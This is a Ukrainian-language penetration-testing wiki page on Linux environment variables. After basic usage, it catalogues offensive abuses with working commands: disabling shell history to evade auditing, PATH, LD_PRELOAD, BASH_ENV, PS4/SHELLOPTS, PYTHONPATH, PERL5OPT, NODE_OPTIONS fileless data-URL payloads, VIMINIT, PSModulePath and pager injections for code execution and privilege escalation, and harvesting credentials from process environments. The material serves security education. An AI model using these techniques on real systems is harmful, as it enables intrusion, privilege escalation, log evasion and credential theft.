# Змінні середовища Linux

{{#include ../../banners/hacktricks-training.md}}

## Глобальні змінні

Глобальні змінні **успадковуватимуться** **дочірніми процесами**.

Створити глобальну змінну для поточного сеансу можна так:

```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```

Ця змінна буде доступна у ваших поточних сеансах і дочірніх процесах.

Ви можете **видалити** змінну, виконавши:

```bash
unset MYGLOBAL
```

## Локальні змінні

**Локальні змінні** доступні лише **поточній оболонці/скрипту**.

```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```

## Список поточних змінних

```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```

Вміст `/proc/*/environ` **розділений нульовими байтами**, тому ці варіанти зазвичай легше читати:

```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```

Якщо ви шукаєте **облікові дані** або **цікаві конфігурації сервісів** у успадкованих середовищах, перевірте також [Linux Post Exploitation](../post-exploitation/README.md).

## Поширені змінні

Джерело: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – дисплей, який використовує **X**. Зазвичай цій змінній присвоєно значення **:0.0**, що означає перший дисплей на поточному комп’ютері.
- **EDITOR** – бажаний текстовий редактор користувача.
- **HISTFILESIZE** – максимальна кількість рядків у файлі історії.
- **HISTSIZE** – кількість рядків, що додаються до файлу історії після завершення користувачем сеансу.
- **HOME** – ваш домашній каталог.
- **HOSTNAME** – ім’я хоста комп’ютера.
- **LANG** – ваша поточна мова.
- **MAIL** – розташування поштової черги користувача. Зазвичай це **/var/spool/mail/USER**.
- **MANPATH** – список каталогів для пошуку сторінок довідки.
- **OSTYPE** – тип операційної системи.
- **PS1** – стандартне запрошення командного рядка в bash.
- **PATH** – містить шляхи до всіх каталогів із бінарними файлами, які можна запускати, просто вказавши ім’я файлу, а не відносний чи абсолютний шлях.
- **PWD** – поточний робочий каталог.
- **SHELL** – шлях до поточної командної оболонки (наприклад, **/bin/bash**).
- **TERM** – тип поточного термінала (наприклад, **xterm**).
- **TZ** – ваш часовий пояс.
- **USER** – ваше поточне ім’я користувача.

## Цікаві змінні для hacking

Не всі змінні однаково корисні. З погляду offensive hacking насамперед звертайте увагу на змінні, що змінюють **шляхи пошуку**, **файли запуску**, **поведінку динамічного компонувальника** або **аудит/журналювання**.

### **HISTFILESIZE**

**Змініть значення цієї змінної на 0**, щоб після **завершення сеансу** **файл історії** (\~/.bash_history) було **обрізано до 0 рядків**.

```bash
export HISTFILESIZE=0
```

### **HISTSIZE**

Змініть **значення цієї змінної на 0**, щоб команди **не зберігалися в історії в пам’яті** й не записувалися назад у **файл історії** (\~/.bash_history).

```bash
export HISTSIZE=0
```

### **HISTCONTROL**

Якщо **значення цієї змінної встановлено як `ignorespace` або `ignoreboth`**, будь-яка команда, перед якою стоїть пробіл, не зберігатиметься в історії.

```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```

### **HISTFILE**

Спрямуйте **файл історії команд** у **`/dev/null`** або повністю скасуйте його. Зазвичай це надійніше, ніж лише змінити розмір історії.

```bash
export HISTFILE=/dev/null
unset HISTFILE
```

### http_proxy & https_proxy

Процеси використовуватимуть оголошений тут **proxy**, щоб підключатися до інтернету через **http або https**.

```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```

### all_proxy & no_proxy

- `all_proxy`: проксі за замовчуванням для інструментів/протоколів, які його підтримують.
- `no_proxy`: список обходу (хости/домени/CIDR), з якими слід з’єднуватися напряму.

```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```

Обидва варіанти — у нижньому та верхньому регістрі — можуть використовуватися залежно від інструмента (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Процеси довірятимуть сертифікатам, указаним у **цих змінних середовища**. Це корисно, щоб змусити такі інструменти, як **`curl`**, **`git`**, HTTP-клієнти Python або менеджери пакетів, довіряти CA, контрольованому зловмисником (наприклад, щоб проксі для перехоплення виглядав легітимним).

```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```

### **PATH**

Якщо привілейована обгортка/скрипт запускає команди **без абсолютних шляхів**, використовуватиметься **перший контрольований атакувальником каталог** у `PATH`. Це основа багатьох **PATH hijacks** у `sudo`, завданнях cron, оболонкових обгортках і власних SUID-помічниках. Шукайте `env_keep+=PATH`, слабкий `secure_path` або обгортки, які викликають `tar`, `service`, `cp`, `python` тощо за назвою.

```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```

Для повних ланцюжків privilege-escalation із використанням `PATH` див. [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` — це не лише посилання на каталог: багато інструментів автоматично завантажують **dotfiles**, **plugins** і **per-user configuration** з `$HOME` або `$XDG_CONFIG_HOME`. Якщо привілейований процес зберігає ці значення, **config injection** може бути простішим за binary hijacking.

```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```

Цікаві цілі включають `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` і файли для конкретних інструментів, наприклад `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Ці змінні впливають на **динамічний компонувальник**:

- `LD_PRELOAD`: примусово завантажує додаткові спільні об'єкти першими.
- `LD_LIBRARY_PATH`: додає каталоги пошуку бібліотек на початок списку.
- `LD_AUDIT`: завантажує бібліотеки-аудитори, які відстежують завантаження бібліотек і розв'язання символів.

Вони надзвичайно цінні для **hooking**, **інструментування** та **підвищення привілеїв**, якщо привілейована команда зберігає їх. У режимі **secure-execution** (`AT_SECURE`, наприклад, для setuid/setgid/capabilities) завантажувач видаляє або обмежує багато з цих змінних. Однак помилки парсера на цьому ранньому етапі завантажувача все ще мають серйозні наслідки, оскільки він запускається **до** цільової програми.<sup>[[2]](#references)</sup>

```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```

### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` змінює ранню поведінку glibc (наприклад, налаштування алокатора) і дуже корисна в exploit-лабораторіях. Вона також важлива з погляду безпеки, оскільки **динамічний завантажувач розбирає її на дуже ранньому етапі**. Уразливість **Looney Tunables** 2023 року нагадала, що одна змінна середовища, яку розбирає завантажувач, може стати **примітивом локального підвищення привілеїв** для програм SUID.<sup>[[6]](#references)</sup>

Для CVE-2023-4911 порівняйте **версію встановленого пакета дистрибутива** з версією, у якій постачальник виправив уразливість, і перевірте, який саме завантажувач використовуватимуть нові процеси. Самого номера версії upstream недостатньо: Debian переніс уразливий парсер у свій пакет версії 2.31, тоді як інші дистрибутиви перенесли виправлення, не змінюючи upstream-номер. Для практичного переходу до привілеїв також потрібна привілейована цільова програма, виконуваний файл якої може змінити ідентифікатор; цьому не мають перешкоджати `NoNewPrivs`, монтування `nosuid` чи інший механізм захисту. Не запускайте зонд для перевірки аварійного завершення з некоректним `GLIBC_TUNABLES` під час пасивного збору даних. Інформацію щодо застосовності виправлень у конкретних релізах дивіться в [Ubuntu tracker](https://ubuntu.com/security/CVE-2023-4911), [Debian tracker](https://security-tracker.debian.org/tracker/CVE-2023-4911) і [Red Hat advisory](https://access.redhat.com/security/cve/cve-2023-4911); у [повідомленні безпеки Ubuntu](https://ubuntu.com/security/notices/USN-6409-1) також рекомендовано перезавантажити систему після оновлення.

```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```

### **BASH_ENV & ENV**

Якщо **Bash** запускається **в неінтерактивному режимі**, він перевіряє `BASH_ENV` і підвантажує цей файл перед запуском цільового скрипту. Коли Bash викликається як `sh` або в інтерактивному режимі POSIX, також може перевірятися `ENV`. Це класичний спосіб перетворити shell-обгортку на виконання коду, якщо середовище контролюється зловмисником.

```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```

Bash ігнорує ці файли запуску, коли **реальні/ефективні ID різняться**; `-p` зберігає ефективний ID, але не вмикає ці файли запуску, тож точна поведінка залежить від того, як обгортка запускає оболонку. Будьте обережні з привілейованими обгортками, які викликають `setuid()`/`setgid()` **перед** запуском Bash: щойно ID знову збігаються, Bash може довіряти `BASH_ENV`, `ENV` і пов’язаному стану оболонки, які інакше ігнорував би.<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Коли Bash працює з увімкненим **xtrace**, він розгортає `PS4` і виводить його перед кожною трасованою командою. `PS4` розгортається як запрошення командного рядка, тому **підстановка команди** всередині нього виконується. Важливо, що xtrace можна ввімкнути лише зі змінної середовища, експортувавши `SHELLOPTS=xtrace` — параметр `-x` у командному рядку не потрібен, — тож будь-який скрипт Bash, який запускає жертва, призводить до виконання коду.<sup>[[7]](#references)</sup>

```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```

`PS4` нічого не робить, доки не активовано xtrace (`SHELLOPTS=xtrace`, `set -x` або `bash -x`), а Bash вилучає `SHELLOPTS` у привілейованому/setuid-контексті так само, як `BASH_ENV`.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP, PYTHONINSPECT & PYTHONBREAKPOINT**

Ці змінні змінюють спосіб запуску Python:

- `PYTHONPATH`: додає на початок списку шляхів пошуку імпорту.
- `PYTHONHOME`: змінює розташування дерева стандартної бібліотеки.
- `PYTHONSTARTUP`: виконує файл перед появою інтерактивного запрошення.
- `PYTHONINSPECT=1`: переходить в інтерактивний режим після завершення скрипту.
- `PYTHONBREAKPOINT`: викликає `package.module.callable` (і імпортує його модуль), коли код доходить до `breakpoint()`.<sup>[[8]](#references)</sup>

Вони можуть бути корисними для атак на скрипти обслуговування, налагоджувачі, оболонки та обгортки, які запускають Python із контрольованим середовищем. `python -E` і `python -I` ігнорують усі змінні `PYTHON*`.

```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```

Нещодавній реальний приклад — LPE у **needrestart** на системах Ubuntu/Debian у 2024 році: сканер, що працював від root, копіював `PYTHONPATH` непривілейованого процесу з `/proc/<PID>/environ`, а потім запускав Python. Опублікований експлойт розміщував `importlib/__init__.so` у контрольованому зловмисником шляху, щоб Python виконав код зловмисника під час власної ініціалізації — ще до того, як жорстко заданий скрипт helper-а мав значення.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

У Perl є не менш корисні змінні запуску:

- `PERL5LIB`: додає каталоги бібліотек на початок списку.
- `PERL5OPT`: передає параметри так, ніби вони вказані в командному рядку кожної команди `perl`.

Це може примусово ввімкнути **автоматичне завантаження модулів** або змінити поведінку інтерпретатора ще до того, як цільовий скрипт зробить щось важливе. Perl ігнорує ці змінні в контекстах **taint / setuid / setgid**, але вони все одно мають велике значення для звичайних обгорток, що запускаються від root, завдань CI, інсталяторів і спеціальних правил sudoers.

Якщо правило sudo дозволяє перевизначення змінних середовища, а привілейована команда зрештою запускає Perl, перевірте також `PERL5DB`. У документації Perl зазначено, що `PERL5OPT=-d` запускає debugger, а `PERL5DB` задає код ініціалізації debugger-а, коли Perl запускається з голим параметром `-d`. Видалення лише `PERL5LIB` і `PERLLIB` не усуває цей шлях. Змінні мають зберегтися під час роботи sudo та обгортки, а процес Perl не повинен ігнорувати їх через обробку taint або set-ID; під час переліку перевірте точне правило й ланцюжок виконання, не запускаючи привілейований helper. Див. [довідку щодо змінних середовища в perlrun](https://perldoc.perl.org/perlrun#ENVIRONMENT).

Вбудований шлях пошуку [`@INC` у Perl](https://perldoc.perl.org/perlvar#@INC) — ще одна межа довіри для модулів, навіть якщо змінні середовища не збережено. Для привілейованого процесу Perl зіставте фактичний оператор `use` або `require` з іменем модуля після розв’язання, порядком пошуку та можливістю користувача з нижчими привілеями створити цей модуль або замінити його в одному з каталогів пошуку. Самої лише можливості запису в каталог бібліотек недостатньо, щоб стверджувати, що привілейований процес завантажить звідти код.

```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```

### **NODE_OPTIONS**

`NODE_OPTIONS` додає **прапорці CLI Node.js** на початок аргументів кожного процесу `node`, який успадковує це середовище. Це робить його корисним для атак на wrappers, завдання CI, допоміжні процеси Electron і правила sudo, які зрештою запускають Node. З погляду атакувальника найцікавіші прапорці зазвичай такі:

- `--require <file>`: завантажити файл CommonJS до цільового скрипту.
- `--import <module>`: завантажити модуль ES до цільового скрипту.

Node відхиляє деякі небезпечні прапорці в `NODE_OPTIONS`, але `--require` і `--import` явно дозволені й обробляються **до** звичайних аргументів командного рядка.<sup>[[4]](#references)</sup>

```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```

#### Безфайлове попереднє завантаження за допомогою URL `data:`

Коли можна встановити `NODE_OPTIONS`, але **не можна записати файл** у цільовій системі (файлова система лише для читання, обмежений API, безсерверне середовище тощо), `--import` приймає URL `data:text/javascript,`, тож увесь payload передається безпосередньо в змінній середовища. JavaScript має бути **повністю закодований у форматі URL** — Node обробляє це значення як URL, тому будь-який незакодований пробіл (або інший незакодований символ) обрізає payload і спричиняє `SyntaxError`. Це працює в Node 20.6+, де `--import` входить до списку дозволених параметрів `NODE_OPTIONS`.<sup>[[4]](#references)</sup>

```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```

> [!TIP]
> Це поширений спосіб перетворити контроль над `NODE_OPTIONS` на RCE у **керованих хмарних середовищах**, де функції запускають Node. Наприклад, зловмисник, який може лише змінювати конфігурацію Lambda (`lambda:UpdateFunctionConfiguration`, без `iam:PassRole` і без оновлення коду), може впровадити `NODE_OPTIONS=--import data:text/javascript,<payload>`, щоб виконати код усередині функції та викрасти облікові дані її ролі виконання. Впроваджений модуль запускається **до** обробника, який після цього все одно виконується звичайним чином.

Щоб дізнатися про віддалені ланцюжки гаджетів, які опосередковано задають `NODE_OPTIONS` (наприклад, через prototype-pollution для отримання RCE), перегляньте [цю іншу сторінку](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Ruby пропонує той самий клас зловживань під час запуску:

- `RUBYLIB`: додає каталоги на початок шляху завантаження Ruby.
- `RUBYOPT`: впроваджує параметри командного рядка, як-от `-r`, у кожен виклик `ruby`.

```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```

Вразливості **needrestart** 2024 року показали, що це не просто лабораторний трюк: той самий helper, що запускається від root і був вразливий до зловживання `PYTHONPATH`, можна було також змусити запускати Ruby з контрольованим зловмисником `RUBYLIB`, завантажуючи `enc/encdb.so` зі зловмисної директорії.<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Vim/Neovim виконують Ex-команди, що містяться у `VIMINIT` (або в його запасному варіанті `EXINIT`), під час звичайного запуску. Ex-команди містять `:!cmd` і `:call system(...)`, тож контроль над змінною дає змогу виконати код щоразу, коли жертва відкриває Vim (наприклад, запускає `sudo vim` від root, `crontab -e`, `visudo`, або коли `git`/`less` запускає `$EDITOR`).<sup>[[9]](#references)</sup>

```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```

Batch mode (`vim -es`/`-Es`) пропускає ці змінні, але звичайний інтерактивний запуск їх виконує.

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS & CLR profiler**

PowerShell Core (`pwsh`) працює на Linux/macOS (і Windows) та є **.NET-застосунком**, тому кілька змінних середовища перетворюють будь-який запуск `pwsh` зі успадкованим середовищем на виконання коду — це корисно проти завдань cron/systemd, CI runners і привілейованих обгорток, які запускають `pwsh`.

- `PSModulePath`: PowerShell рекурсивно шукає в кожному каталозі зі списку модулі `.psd1`/`.psm1` і **автоматично завантажує** модуль, щойно вперше викликається команда, яку він експортує. Додайте каталог на початок списку — і код верхнього рівня вашого модуля виконається під час імпорту; оскільки порядок розв’язання такий: *Alias → Function → Cmdlet*, експортована функція може навіть підмінити вбудований cmdlet, який викликає жертва.<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`: змінює розташування `powershell/Microsoft.PowerShell_profile.ps1`, який виконується під час запуску (якщо не вказано `-NoProfile`).
- `DOTNET_STARTUP_HOOKS`: керована збірка, метод `StartupHook.Initialize()` якої виконується перед `Main` (спільна для всіх .NET-застосунків).
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: API профілювання CLR завантажує бібліотеку зловмисника в процес під час запуску (змінні шляху мають пріоритет над реєстром; `DOTNET_*` — новіший псевдонім). У Windows PowerShell 5.1 (.NET Framework) використовуйте `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH`. MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>

```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```

У Windows `PSExecutionPolicyPreference=Bypass` додатково вимикає захист «блокування непідписаних скриптів», тож підкинутий профіль/модуль справді запускається. Повні PoC дивіться на окремій сторінці:

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Деякі інструменти не просто читають шлях зі змінного середовища — вони передають значення **shell**, **редактору** або **препроцесору введення**. Через це наведені нижче змінні особливо цікаві, коли привілейована обгортка запускає `git`, `man`, `less` або подібні засоби перегляду тексту:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: задають команду pager.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: задають команду редактора, часто з аргументами.
- `LESSOPEN`, `LESSCLOSE`: задають пре-/постпроцесори, які запускаються під час відкриття файла в `less`.

```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```

Git також підтримує **ін’єкцію конфігурації лише через змінні середовища** без запису на диск за допомогою `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` і `GIT_CONFIG_VALUE_<n>`:

```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```

З погляду post-exploitation також пам’ятайте, що успадковане середовище часто містить **облікові дані**, **налаштування проксі**, **токени служб** або **ключі хмарних платформ**. Див. [Linux Post Exploitation](../post-exploitation/README.md), щоб дізнатися про пошук у `/proc/<PID>/environ` і `Environment=` у `systemd`.

### PS1

Змініть вигляд запрошення командного рядка.

[**Ось приклад**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Ось приклад](<../images/image (897).png>)

Звичайний користувач:

![PERL5OPT & PERL5LIB - PS1: Одне, два й три завдання, запущені у фоновому режимі](<../images/image (740).png>)

Одне, два й три завдання, запущені у фоновому режимі:

![PERL5OPT & PERL5LIB - PS1: Одне, два й три завдання, запущені у фоновому режимі](<../images/image (145).png>)

Одне фонове завдання, одне призупинене, а остання команда завершилася з помилкою:

![PERL5OPT & PERL5LIB - PS1: Одне фонове завдання, одне призупинене, а остання команда завершилася з помилкою](<../images/image (715).png>)

## References

- [1] [Посібник GNU Bash — файли запуску Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys — LPE у needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Документація Node.js CLI — `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Поширені змінні середовища — Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables — локальне підвищення привілеїв у ld.so бібліотеки glibc — Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [Посібник GNU Bash — змінні Bash (`PS4`) і вбудована команда Set (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 — вбудована функція breakpoint() і PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Документація Vim — starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath і автоматичне завантаження модулів PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [Параметри конфігурації налагодження та профілювання .NET (змінні профілювальника `CORECLR_`/`DOTNET_`/`COR_`)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
